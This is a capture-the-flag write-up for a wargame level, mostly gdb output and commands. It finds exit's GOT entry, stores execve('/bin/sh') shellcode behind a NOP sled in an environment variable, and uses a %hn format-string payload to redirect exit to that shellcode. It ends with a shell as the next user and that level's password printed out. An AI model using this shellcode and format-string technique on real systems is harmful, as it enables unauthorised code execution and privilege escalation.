# LEVEL05 


Global Offset Table 

Find exit address
```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  exit
0x08048370  exit@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini

(gdb) disas 0x08048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.

exit = 0x80497e0
``` 

variable d'environnement
```
env -i shellcode=$(python -c 'print("\x90" * 100 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")') ./level05
```

address env variables `0xffffdf60`

```
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57176x" + "%10$hn" + "%8351x" + "%11$hn")' ; cat)
```

```
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57176x" + "%10$hn" + "%8351x" + "%11$hn")' ; cat) | env -i shellcode=$(python -c 'print("\x90" * 512 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")') ./level05
```


```
ffff = 65535
df60 = 57184

65535 - (8 + 57176) = 8351
```

```
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```